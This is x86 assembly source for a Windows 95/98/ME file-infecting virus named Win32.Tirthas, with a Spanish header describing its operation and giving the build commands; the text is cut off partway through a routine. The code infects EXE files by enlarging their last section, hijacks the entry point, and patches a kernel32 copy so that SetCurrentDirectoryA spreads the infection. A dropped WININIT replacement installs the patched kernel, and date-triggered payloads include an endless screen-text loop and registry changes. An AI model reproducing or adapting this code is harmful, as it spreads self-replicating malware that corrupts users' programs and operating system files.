
;============================================================================
;
; WIN32.TIRTHAS - WRITTEN BY KENERMAM
; (c)2001-02 SPAIN.
;
;
;============================================================================
;
; DESCRIPCION
; ===========
; 
;Especimen dise¤ado para WIN 95/98/ME que infecta el kernel32.dll creando
;una nueva seccion llamada .Tirthas. Los archivos los infecta aumentado
;la ultima seccion. Tiene tres payload quedando seleccionado uno en cada
;infeccion.
;
;
; FUNCIONAMIENTO
; ==============
;
;Los pasos del virus al ser ejecudado son:
;
; 1 - Obtencion de la direccion base del KERNEL.
; 2 - Obtiene el ordinal de la funcion SetCurrentDirectoryA.
; 3 - Obtiene la direccion de la funcion GetProcAddress.
; 4 - Obtiene las direcciones de las funciones necesarias.
; 5 - Test de la fecha del sistema.
; 6 - Busqueda de archivos.
; 7 - Infeccion de archivos.
; 8 - Comprueba si el kernel esta infectado.
; 9 - Si el kernel no esta infectado:
;     10 - Busca el directorio WINDOWS y SYSTEM.
;     11 - Comprueba si existe KERNEL32.DL_ si no esta lo crea.
;     12 - Modifica kernel32.dl_
;     13 - Crea WINSYSTEM.KER
;     14 - Crea WININIT.INI
;
;
; DETALLES
; ========
;
;La infeccion de archivos se realiza mediante el aumento de la ultima seccion
;del archivo.
;La infeccion del kernel se realiza mediante la modificacion del archivo
;WININIT.EXE el cual es cargado antes que el kernel y por tanto se puede
;cambiar el mismo desde esta situacion. El cambio del kernel32 se realiza
;sustituyendo el archivo KERNEL32.DLL por el kernel modificado por el virus
;situado en un archivo llamado KERNEL32.DL_.Este nuevo nucleo tiene
;interceptada la funcion SetCurrentDirectoryA. Cuando desde un sistema
;infectado es llamada esta funcion (cualquier programa llama a esta funcion
;cuando pulsas sobre una carpeta o escribes un directorio) el virus busca en
;el directorio los archivos EXE existentes y los infecta.
;Para infectar kernel32.dl_ (copia de kernel32.dll) busca la ultima seccion
;y tras esta crea una nueva seccion llamada .Tirthas en la cual se introduce
;el virus. Despues de esto comienza la busqueda de la seccion de
;exportaciones para cambiar la RVA de la funcion SetCurrentDirectoryA por
;otra que apunta a la funcion SetCurrentDirectoryA del virus. Cuando
;cualquier proceso llama a esta funcion el virus comienza a actuar buscando e
;infectando los archivos existentes de la carpeta seleccionada
;
;
; PAYLOAD
; =======
;
;Tirthas cuenta con tres payload, de los cuales solo se activara uno en cada
;archivo infectado.
;
;  1 - Payload: Muestra un mensaje de texto:
;
;           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   
;           ³WIN32.TIRTHAS WRITTEN BY KENERMAM. (c)2001-02 SPAIN ³
;           ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   
;           ³ KENERMAM MESSAGE:                                  ³
;           ³                                                    ³
;           ³ YOU ARE FOUL.                                      ³
;           ³ THIS IS INFECTION OF TIRTHAS.                      ³
;           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;         
;  2 - Payload: Rellena la parate izquierda de la pantalla de windows con el
;               texto YOU ARE FOUL.
;
;  3 - Payload: Cambia los atributos de accesibilidad de windows.
;
;
; FICHA
; =====
;
; Nombre:                 WIN32.TIRTHAS
; Autor:                  KENERMAM
; Origen:                 ESPA¥A
; Plataforma:             WIN 95/98/ME
; Tama¤o:                 12288 bytes
; Objetivos:              ARCHIVOS EXE
; Residencia en memoria:  INFECTA EL ARCHIVO KERNEL32.DLL E INTERCEPTA LA 
;                         FUNCION SetCurrentDirecoryA
;
;
; COMPILACION
; ===========
;
; Tasm32 /ml /m5 WIN32TIRTHAS.ASM
; Tlink32 -Tpe -x -aa WIN32TIRTHAS,,, IMPORT32
; Pewrsec WIN32TIRTHAS.EXE
;
;
;==================================TIRTHAS===================================
;============================================================================

      .386p
      .model flat

      extrn ExitProcess:proc

      .data

       db 'WIN32.TIRTHAS'
                              
      .code                                        
Tirthas_start  label byte

Tirthas:
      call DeltaOffset

DeltaOffset:
      pop ebp
      sub ebp, offset DeltaOffset          

      ;----------------------------------------------------------------------
      ;Obtencion de la direccion base del Kernel32 para, posteriormente,
      ;calcular la direccion de GetProcAddress.
      ;----------------------------------------------------------------------

      xor edx,edx
      mov esi,dword ptr fs:[edx]
      mov dword ptr [ebp+Old_SEH],esi
      mov eax,offset [ebp+My_SEH]
      mov fs:[edx],eax

      mov eax,dword ptr ds:[esp]
      and eax,0ffff0000h
      
Find_baseK:

      sub eax,10000h
      cmp word ptr [eax],'ZM'
      je Put_old_SEH                              

My_SEH: jmp Find_baseK 
     
Put_old_SEH:

      mov esi,dword ptr [ebp+Old_SEH]
      mov dword ptr fs:[edx],esi

Search_info:

      mov dword ptr [ebp+Base_kernel],eax
      mov dword ptr [ebp+Handle_kernel32],eax
      mov edi,dword ptr [eax+3ch]
      add edi,eax                                  ;EDI= cabecera real del PE.

      mov eax,dword ptr [edi+78h]
      add eax,[ebp+Base_kernel]
      mov dword ptr [ebp+Address_export_table],eax  ;tabla de exportaciones.

      xor ecx,ecx                                   ;contador.
      mov edi,dword ptr [eax+20h]
      add edi,[ebp+Base_kernel]
      mov eax,edi
      xor edi,edi

Find_fuction:
      
      mov esi,dword ptr [eax]
      add esi,[ebp+Base_kernel]

comparativa:
      mov edx,dword ptr [esi]

      cmp byte ptr [ebp+Flag_funciones],0
      je SetCurrentDirectoryA_F

 GetProcAddress_F:

      cmp dword ptr [ebp+T_GetProcAddress+edi],edx
      jnz More_rva
      jmp Resultado

 SetCurrentDirectoryA_F:

      cmp dword ptr [ebp+T_SetCurrentDirectoryA+edi],edx
      jnz More_rva

   Resultado:
      add esi,4h
      add edi,4h

      cmp byte ptr [ebp+Flag_funciones],0
      je Max_SetCurrentDirectoryA

      cmp edi,0ch
      je  Fuction_ok
      jmp comparativa

 Max_SetCurrentDirectoryA:

      cmp edi,10h
      je Fuction_ok
      jmp comparativa

 More_rva:
      xor edi,edi
      inc ecx
      add eax,4
      jmp Find_fuction

 Fuction_ok:

      rol ecx,1      
      mov edi,dword ptr [ebp+Address_export_table]
      mov edi,dword ptr [edi+24h]             
      add edi,[ebp+Base_kernel]
      add edi,ecx
      movzx esi,word ptr [edi]

      ;----------------------------------------------------------------------
      ; GUARDAMOS LOS ORDINALES DE LAS FUNCIONES
      ;----------------------------------------------------------------------

      cmp byte ptr [ebp+Flag_funciones],0
      jne Get_RVA

      mov dword ptr [ebp+Ordinal_funcion_1],esi


 Get_RVA:

      rol esi,2
      mov edi,dword ptr [ebp+Address_export_table]
      mov edi,dword ptr [edi+1ch]
      add edi,[ebp+Base_kernel]
      add edi,esi                                     
      mov ebx,edi
      mov eax,dword ptr [edi]

      cmp byte ptr [ebp+Flag_funciones],1
      je Save_GetProcAddress

      add byte ptr [ebp+Flag_funciones],1
      mov eax,dword ptr [ebp+Base_kernel]
      jmp Search_info

 Save_GetProcAddress:

      mov byte ptr [ebp+Flag_funciones],0
      add eax,[ebp+Base_kernel]
      mov dword ptr [ebp+A_GetProcAddress],eax

      ;----------------------------------------------------------------------
      ;BUSQUEDA DE DIRECCIONES 
      ;----------------------------------------------------------------------

      mov  ecx,13h
      lea  edi,[ebp+Address_list_1]
      lea  esi,[ebp+Fuction_list_1]
      call Get_Address_1

      lea eax,[ebp+File_ADVAPI32]              
      push eax
      call [ebp+A_LoadLibraryA]
      mov dword ptr [ebp+Base_kernel],eax

      mov ecx,3h
      lea edi,[ebp+Address_list_2]
      lea esi,[ebp+Fuction_list_2]
      call Get_Address_1

      lea eax,[ebp+File_USER32]
      push eax
      call [ebp+A_LoadLibraryA]
      mov dword ptr [ebp+Base_kernel],eax

      mov ecx,5h
      lea edi,[ebp+Address_list_3]
      lea esi,[ebp+Fuction_list_3]
      call Get_Address_1

      lea eax,[ebp+File_GDI32]
      push eax
      call [ebp+A_LoadLibraryA]
      mov dword ptr [ebp+Base_kernel],eax

      mov ecx,1
      lea edi,[ebp+Address_list_4]
      lea esi,[ebp+Fuction_list_4]              
      call Get_Address_1

      jmp Check_date

      ;----------------------------------------------------------------------
      ; Calculo de las RVA's de las nuevas funciones
      ;----------------------------------------------------------------------
      ;
      ; Salida:
      ;   EAX = RVA de la nueva funcion.
      ;----------------------------------------------------------------------

 calc_RVA:

      mov eax,[ebp+Virtual_address]
      add eax,SetCurrentDirectoryA_size
      mov dword ptr [ebp+Datos_0],eax            ;RVA de SetCurrentDirectoryA
     
      ret

      Datos_0 dd 0

      ;----------------------------------------------------------------------
      ;Obtencion de direcciones.
      ;----------------------------------------------------------------------
      ; Entrada:
      ;  ECX = Numero de direcciones a obtener.
      ;  EDI = Puntero a la tabla de direcciones.
      ;  ESI = Puntero a la tabla de nombres.
      ;
      ; Salida:
      ;  Direcciones de las funciones de la tabla de nombres.
      ;----------------------------------------------------------------------

 Get_Address_1:

      push ecx
      jmp Get_Address

 Get_Apis:

      cmp byte ptr [esi],0h
      je Incremento
      inc esi
      jmp Get_Apis

 Incremento:

      inc esi

 Get_Address:

      push esi
      push dword ptr [ebp+Base_kernel]
      call [ebp+A_GetProcAddress]
      stosd
      pop ecx
      dec ecx

      cmp ecx,0
      je Quit_find_apis

      push ecx
     
      jmp Get_Apis

 Quit_find_apis:
      ret

      ;----------------------------------------------------------------------
      ; FUNCION FindFirstFileA
      ;----------------------------------------------------------------------
      ; 0 = Kernel32.dl_
      ; 1 = winsystem.ker
      ;----------------------------------------------------------------------

 Fuction_Find_first_file:

      lea eax,[ebp+Info_file]
      push eax

      cmp byte ptr [ebp+Flag_fuction_Find_File],0
      jne Is_wininit

      lea eax,[ebp+Kernel32backup]
      push eax
      jmp Call_find_file

 Is_wininit:

      lea eax,[ebp+File_System_addr]
      push eax

 Call_find_file:

      call [ebp+A_FindFirstFileA]
      ret
      ;----------------------------------------------------------------------
      ; GUARDAR REGISTROS
      ;----------------------------------------------------------------------

 Save_register:

      mov dword ptr [ebp+EAX_seg],eax
      mov dword ptr [ebp+EBX_seg],ebx  
      mov dword ptr [ebp+ECX_seg],ecx  
      mov dword ptr [ebp+EDX_seg],edx 
      mov dword ptr [ebp+ESI_seg],esi  
      mov dword ptr [ebp+EDI_seg],edi  

      ret

      ;----------------------------------------------------------------------
      ; RESTAURAR REGISTROS
      ;----------------------------------------------------------------------

 Old_register:

      mov eax,dword ptr [ebp+EAX_seg]
      mov ebx,dword ptr [ebp+EBX_seg]
      mov ecx,dword ptr [ebp+ECX_seg]
      mov edx,dword ptr [ebp+EDX_seg]
      mov esi,dword ptr [ebp+ESI_seg]
      mov edi,dword ptr [ebp+EDI_seg]

      ret

      ;//////////////////////////////////////////////////////////////////////
      ;/////////////////////// Control del KERNEL ///////////////////////////
      ;//////////////////////////////////////////////////////////////////////

      ;----------------------------------------------------------------------
      ;----------------------------------------------------------------------
      ; Funcion: SetCurrentDirectoryA
      ;----------------------------------------------------------------------
      ;----------------------------------------------------------------------

 SetCurrentDirectoryA:

      push ebp
      call Delta_in_kernel_1

 Delta_in_kernel_1:

      pop ebp
      sub ebp,offset Delta_in_kernel_1

      ;----------------------------------------------------------------------
      ; GUARDAR REGISTROS
      ;----------------------------------------------------------------------

      call Save_register

      pop eax
      mov dword ptr [ebp+EBP_seg],eax

      pop eax
      mov dword ptr [ebp+Return_address],eax

      ;----------------------------------------------------------------------
      ; MARCA DE RESIDENCIA
      ;----------------------------------------------------------------------

      call Old_register

      cmp ecx,7BFh
      jne Search_file_in_directory

      mov ecx,7C7h

      call Save_register

      jmp Pass_control

      ;----------------------------------------------------------------------
      ; ACCIONES
      ;----------------------------------------------------------------------

 Search_file_in_directory:

      call [ebp+A_SetCurrentDirectoryA]

      call Save_register

      lea eax,[ebp+Info_file]
      lea ebx,[ebp+Files_exe]
      push eax
      push ebx
      call [ebp+A_FindFirstFileA]

      inc eax
      je Pass_control
      dec eax

      mov dword ptr [ebp+Handle_find_files],eax

      ;----------------------------------------------------------------------
      ; ABRIR EL ARCHIVO
      ;----------------------------------------------------------------------
 
      mov byte ptr [ebp+Flag_infection_by_fuction],1

      call Open_file

      mov byte ptr [ebp+Flag_infection_by_fuction],0

 More_files:

      lea eax,[ebp+Info_file]
      push eax
      push dword ptr [ebp+Handle_find_files]
      call [ebp+A_FindNextFileA]

      cmp eax,0
      je Pass_control

      mov byte ptr [ebp+Flag_infection_by_fuction],1

      call Open_file

      mov byte ptr [ebp+Flag_infection_by_fuction],0

      jmp More_files

      ;----------------------------------------------------------------------
      ; PASAR EL CONTROL
      ;----------------------------------------------------------------------

 Pass_control:

      call Old_register

      push dword ptr [ebp+Return_address]

      push dword ptr [ebp+EBP_seg]
      pop ebp
      ret


      ;//////////////////////////////////////////////////////////////////////

      ;----------------------------------------------------------------------
      ; TESTEO DE LA FECHA DEL SISTEMA
      ;----------------------------------------------------------------------

 Check_date:

      lea eax,[ebp+date_system]
      push eax
      call [ebp+A_GetSystemTime]

      mov ax,word ptr [ebp+Day]
      mov bx,word ptr [ebp+Month]

      cmp bx,5h
      jne Search_files

      cmp ax,13h
      jne Search_files

      ;----------------------------------------------------------------------
      ; PAYLOAD
      ;----------------------------------------------------------------------
      ; En cada infeccion hay un numero para activar uno de los tres payload
      ; que tiene el virus. El primer payload consiste en mostrar un mensaje
      ; con los creditos. El segundo llena el borde izquierdo de la pantalla
      ; con el mensaje YOU ARE FOUL. Por ultimo, el tercero, cambia las
      ; opciones de accesibilidad del sistema.
      ;----------------------------------------------------------------------

      cmp byte ptr [ebp+Numero_payload],0
      jne Payload_2

      ;----------------------------------------------------------------------
      ; PAYLOAD 1
      ;----------------------------------------------------------------------

      lea eax,[ebp+Title_Box_1]
      lea ebx,[ebp+Message_1]
      push 0
      push eax
      push ebx
      push 0
      call [ebp+A_MessageBoxA]
      jmp Search_files

      Title_Box_1 db " WIN32.TIRTHAS WRITTEN BY KENERMAM. (c)2001-02 SPAIN ",0
      Message_1   db " KENERMAM MESSAGE:",10
                  db " YOU ARE FOUL.",10
                  db " THIS IS INFECTION OF TIRTHAS.",0

      ;----------------------------------------------------------------------
      ; PAYLOAD 2
      ;----------------------------------------------------------------------

Payload_2:

      cmp byte ptr [ebp+Numero_payload],2
      jne Payload_3

      mov eax,dword ptr [ebp+Handle_kernel32]
      mov dword ptr [ebp+HandleInstance],eax

      lea eax,[ebp+Windows_class]
      push eax
      call [ebp+A_RegisterClassA]

      push 0
      push dword ptr [ebp+Handle_kernel32]
      push 0
      push 0
      push 0
      push 0
      push 0
      push 0
      push 50000h
      lea eax,[ebp+Title_Windows]
      push eax
      push eax
      push 0
      call [ebp+A_CreateWindowExA]

      mov dword ptr [ebp+Handle_windows],eax
      mov esi,0ah
      mov ebx,1eh

 Infinito:

      push 1
      push dword ptr [ebp+Handle_windows]
      call [ebp+A_ShowWindow]

      push dword ptr [ebp+Handle_windows]
      call [ebp+A_GetDC]

      lea edi,[ebp+Texto]
      push 0eh
      push edi
      push esi  ;y
      push ebx  ;x
      push eax
      call [ebp+A_TextOutA]
      add esi,14h
      jmp Infinito

      ;----------------------------------------------------------------------
      ; PAYLOAD 3
      ;----------------------------------------------------------------------

 Payload_3:

      lea ebx,[ebp+Handle_registro]
      lea eax,[ebp+Clave_Accessibility]
      push ebx
      push 000f003fh
      push eax
      push 80000001h                              ;Identificacion
      call [ebp+A_RegOpenKeyExA]

      lea ebx,[ebp+Valor]
      lea eax,[ebp+Nombre_clave]

      push 1
      push ebx
      push 1
      push 0
      push eax
      push dword ptr [ebp+Handle_registro]
      call [ebp+A_RegSetValueExA]

      push dword ptr [ebp+Handle_registro]
      call [ebp+A_RegCloseKey]

      ;----------------------------------------------------------------------
      ; BUSQUEDA DE ARCHIVOS
      ;----------------------------------------------------------------------

 Search_files:

      lea eax,[ebp+Info_file]
      lea ebx,[ebp+Files_exe]
      push eax
      push ebx
      call [ebp+A_FindFirstFileA]

      inc eax
      jz Test_KERNEL
      dec eax

      mov dword ptr [ebp+Handle_find_files],eax
      jmp Open_file

 Next_files:

      lea eax,[ebp+Info_file]
      push eax
      push dword ptr [ebp+Handle_find_files]
      call [ebp+A_FindNextFileA]

      cmp eax,0
      je Test_KERNEL

      ;----------------------------------------------------------------------
      ; ABRE Y MAPEA EL ARCHIVO
      ;----------------------------------------------------------------------

 Open_file:

      cmp byte ptr [ebp+Flag_infection_by_fuction],1
      jne Standar_open

      pop eax
      mov dword ptr [ebp+Return_address_in_virus],eax

 Standar_open:

      lea eax,[ebp+FileName]
      
      push 0                                    
      push 0
      push 3
      push 0
      push 1
      push 0c0000000h                             ;lectura/escritura.
      push eax
      call [ebp+A_CreateFileA]

      inc eax
      jz Next_step_1
      dec eax

      mov dword ptr [ebp+Handle_createfile],eax

      push 0
      push dword ptr [ebp+FSizeL]
      push 0
      push 4
      push 0
      push eax
      call [ebp+A_CreateFileMappingA]

      cmp eax,0
      jz Close_file

      mov dword ptr [ebp+Handle_createfilemap],eax

      push dword ptr [ebp+FSizeL]
      push 0
      push 0
      push 2                                      ;escritura.
      push eax                                  
      call [ebp+A_MapViewOfFile]

      cmp eax,0
      jz Close_filemapping

      mov dword ptr [ebp+Base_fichero],eax

      cmp byte ptr [ebp+Flag_open_kernel],1
      je Header_kernel

      cmp word ptr [eax],'ZM'
      jnz Close_mapping

      mov esi,dword ptr [eax+3ch]
      add esi,eax                                 ;PE-header.

      mov dword ptr [ebp+Address_PEheader],esi

      mov edi,dword ptr [esi+34h]
      mov dword ptr [ebp+Image_base],edi
      cmp word ptr [esi],'EP'                     ;Marca de los PE.
      jnz Close_mapping


      mov ax,word ptr [esi+14h]

      cmp ax,0
      je Close_mapping
    
      mov ax,word ptr [esi+16h]
      and ax,0002h                                ;Caracteristicas
      jz Close_mapping

      ;----------------------------------------------------------------------
      ; COMPROBAR LA MARCA DE INFECCION
      ;----------------------------------------------------------------------

      mov eax,dword ptr [esi+4ch]

      cmp eax,'seem'
      je Close_mapping

      cmp byte ptr [ebp+Flag_numero],0
      jne Change_realiced

      mov ecx,Tirthas_size
      add ecx,1000h                               ;Espacio para trabajo
      add [ebp+FSizeL],ecx
      or byte ptr [ebp+Flag_numero],1

      jmp Close_mapping

Change_realiced:

      mov [ebp+Flag_numero],0
      mov [esi+4ch],'seem'                        ;Marca de infeccion

      movzx eax,word ptr [esi+6h]                 ;Numero de secciones.
      mov ebx,esi
      dec eax
      mov edi,28h                                 ;Tama¤o de la cabecera de
      mul edi                                     ;la seccion.
      add esi,78h
      add esi,eax
      mov edi,dword ptr [ebx+74h]
      rol edi,3
      add esi,edi                                 
      mov dword ptr [ebp+Address_Last_section],esi

      ;----------------------------------------------------------------------
      ; CARACTERISTICAS DE LA SECCION
      ;----------------------------------------------------------------------

      mov eax,dword ptr [esi+24h]
      or eax,0c0000000h
      mov dword ptr [esi+24h],eax

      ;modificando la seccion.

      mov eax,dword ptr [esi+0ch]
      mov dword ptr [ebp+Virtual_address_LS],eax
      mov eax,dword ptr [esi+14h]
      mov dword ptr [ebp+Pointer_to_raw_data_LS],eax
      mov eax,dword ptr [esi+8h]
      mov dword ptr [ebp+Virtual_size_LS],eax

      add eax,Tirthas_size
      add eax,1000h
      mov dword ptr [esi+8h],eax                  ;Nuevo Virtual size.

      push eax
      mov eax,dword ptr [ebp+Address_PEheader]
      mov edi,dword ptr [eax+38h]
      mov dword ptr [ebp+Section_alignment],edi
      mov edi,dword ptr [eax+3ch]                 ;EDI= File alignment.
      pop eax
      xor edx,edx
      div edi
      inc eax
      mul edi
      mov dword ptr [esi+10h],eax                 ;Nuevo Size Of Raw Data.

      mov edi,dword ptr [ebp+Address_PEheader]

      mov ecx,Tirthas_size
      add ecx,1000h

      mov eax,dword ptr [edi+50h]
      add eax,ecx
      xor edx,edx
      mov ebx,dword ptr [ebp+Section_alignment]
      div ebx
      inc eax
      mul ebx

      mov dword ptr [edi+50h],eax                 ;Nuevo Size of Image.

      ;----------------------------------------------------------------------
      ; NUEVO ENTRY POINT
      ;----------------------------------------------------------------------

      mov esi,dword ptr [ebp+Virtual_address_LS]     ;rva...
      mov eax,dword ptr [ebp+Virtual_size_LS]
      add esi,eax                                 ;ESI= Entry Point
      mov dword ptr [ebp+New_entry_point],esi
      mov eax,dword ptr [ebp+Address_PEheader]
      mov edi,dword ptr [eax+28h]
      mov dword ptr [ebp+Old_entry_point],edi
      mov dword ptr [eax+28h],esi

      ;----------------------------------------------------------------------
      ; SELECCION DE PAYLOAD
      ;----------------------------------------------------------------------

      cmp byte ptr [ebp+Numero_payload],2
      jne Meter_inc

      mov byte ptr [ebp+Numero_payload],0
      jmp Infection_file

 Meter_inc:

      add byte ptr [ebp+Numero_payload],1

      ;----------------------------------------------------------------------
      ; INFECCION DEL ARCHIVO
      ;----------------------------------------------------------------------     

 Infection_file:

      mov ecx,Tirthas_size
      mov edi,dword ptr [ebp+Pointer_to_raw_data_LS]
      add edi,dword ptr [ebp+Virtual_size_LS]      
      add edi,dword ptr [ebp+Base_fichero]
      lea esi,[ebp+offset Tirthas_start]
      rep movsb

      ;----------------------------------------------------------------------
      ; CIERRE DEL ARCHIVO INFECTADO
      ;----------------------------------------------------------------------

 Close_mapping:

      mov eax,dword ptr [ebp+Base_fichero]
      push eax
      call [ebp+A_UnmapViewOfFile]

 Close_filemapping:

      mov eax,dword ptr [ebp+Handle_createfilemap]
      push eax
      call [ebp+A_CloseHandle]

 Close_file:

      mov eax,dword ptr [ebp+Handle_createfile]
      push eax
      call [ebp+A_CloseHandle]

      cmp byte ptr [ebp+Flag_open_kernel],1
      je New_Wininit

      cmp byte ptr [ebp+Flag_numero],1
      je Standar_open

      cmp byte ptr [ebp+Flag_infection_by_fuction],1
      je Return_to_fuction

      jmp Next_files

 Next_step:

       cmp byte ptr [ebp+Flag_open_kernel],1
       je New_Wininit
       jmp Next_files

 Next_step_1:

       cmp byte ptr [ebp+Flag_infection_by_fuction],1
       jne Next_step

 Return_to_fuction:

       push dword ptr [ebp+Return_address_in_virus]
       ret

      ;----------------------------------------------------------------------
      ; NUEVO WININIT.EXE
      ;----------------------------------------------------------------------
      ; Se encarga de eliminar el kernel32.dll antes de ser cargado.
      ;----------------------------------------------------------------------

      New_wininit_start   label byte

      db 4dh,5ah,59h,1h,2h,0,1h,0
      db 20h,0,0,0,0ffh,0ffh,0,0
      db 80h,0,0,0,0,0,11h,0
      db 3eh,0,0,0,1h,0,0fbh,71h
      db 6ah,72h,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,1h,0
      db 11h,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,0,0,0,0
      db 0,0,0,0,6bh,65h,72h,6eh
      db 65h,6ch,33h,32h,2eh,64h,6ch,6ch
      db 0,6bh,65h,72h,6eh,65h,6ch,33h
      db 32h,2eh,64h,6ch,5fh,0,63h,3ah
      db 5ch,77h,69h,6eh,73h,79h,73h,31h
      db 2eh,6bh,65h,72h,0,0,0,0
      db 0b8h,8h,0,8eh,0d8h,8eh,0c0h,0b8h
      db 2h,3dh,0bah,7eh,0,0cdh,21h,8bh
      db 0d8h,33h,0f6h,0b4h,3fh,0b9h,64h,0
      db 0bah,0,0,0cdh,21h,0b4h,3eh,0cdh
      db 21h,0b4h,3bh,0bah,0,0,0cdh,21h
      db 0b4h,4eh,0bah,71h,0,33h,0c9h,0cdh
      db 21h,72h,11h,0bah,64h,0,0b4h,041h
      db 0cdh,21h,0bah,71h,0,0bfh,64h,0
      db 0b4h,56h,0cdh,21h,0b8h,0,4ch,0cdh,21h

      New_wininit_end     label byte

      ;----------------------------------------------------------------------
      ; COMPRUEBA SE EL KERNEL ESTA INFECTADO
      ;----------------------------------------------------------------------
      ; Para comprobar si el kernel esta infectado, se llama a la funcion
      ; SetCurrentDirectoryA con el valor 7BFh en ECX. Si la funcion devuelve
      ; en ECX el valor 7C7h significa que el kernel esta infectado.
      ;----------------------------------------------------------------------

 Test_KERNEL:

      mov ecx,7BFh
      call [ebp+A_SetCurrentDirectoryA]

      cmp ecx,7C7h
      je Generalt_exit

      ;----------------------------------------------------------------------
      ; Buscar el directorio WINDOWS Y SYSTEM
      ;----------------------------------------------------------------------

      lea eax,[ebp+Windows_path]

      push 0c8h
      push eax
      call [ebp+A_GetWindowsDirectory]           

      lea eax,[ebp+System_path]

      push 0c8h
      push eax
      call [ebp+A_GetSystemDirectoryA]           

      mov ecx,7BFh
      lea eax,[ebp+System_path]                   ;Lo establezemos como
      push eax                                    ;directorio actual
      call [ebp+A_SetCurrentDirectoryA]

      ;----------------------------------------------------------------------
      ; VER SI EXISTE KERNEL32.DL_
      ;----------------------------------------------------------------------

      mov byte ptr [ebp+Flag_fuction_Find_File],0
      call Fuction_Find_first_file

      inc eax
      jne Generalt_exit
      dec eax

      ;----------------------------------------------------------------------
      ; COPIA KERNEL32.DLL A KERNEL32.DL_
      ;----------------------------------------------------------------------

      lea ebx,[ebp+offset Kernel32]                  ;kernel32.dll
      lea eax,[ebp+offset Kernel32backup]            ;kernel32.dl_
      push 1
      push eax
      push ebx
      call [ebp+A_CopyFileA]

      mov byte ptr [ebp+Flag_fuction_Find_File],0
      call Fuction_Find_first_file

      inc eax
      je New_Wininit
      dec eax

      mov ecx,Tirthas_size
      add dword ptr [ebp+FSizeL],ecx
      mov byte ptr [ebp+Flag_open_kernel],1
      jmp Open_file

 Header_kernel:                            ;Base_file = base de kernel32.dl_

      mov eax,[eax+3ch]
      add eax,dword ptr [ebp+Base_fichero] ;EAX = PE header
      mov dword ptr [ebp+Address_PEheader],eax

      movzx ebx,word ptr [eax+6h]
      mov dword ptr [ebp+Number_section],ebx

      movzx ebx,word ptr [eax+14h]
      mov dword ptr [ebp+Size_optional_header],ebx

      mov ebx,dword ptr [eax+38h]
      mov dword ptr [ebp+Section_alignment],ebx

      mov ebx,dword ptr [eax+3ch]
      mov dword ptr [ebp+File_alignment],ebx

      ;----------------------------------------------------------------------
      ; OBTENER LA ULTIMA SECCION DEL KERNEL
      ;----------------------------------------------------------------------

      mov ebx,dword ptr [eax+74h]                
      xor eax,eax
      mov eax,8
      mul ebx
      mov edi,eax                              ;EDI = Nø directorios * tama¤o

      mov ebx,dword ptr [ebp+Number_section]
      dec ebx
      mov eax,28h
      mul ebx                                  ;EAX = Nø de seccion * tama¤o

      add edi,eax
      add edi,dword ptr [ebp+Address_PEheader]
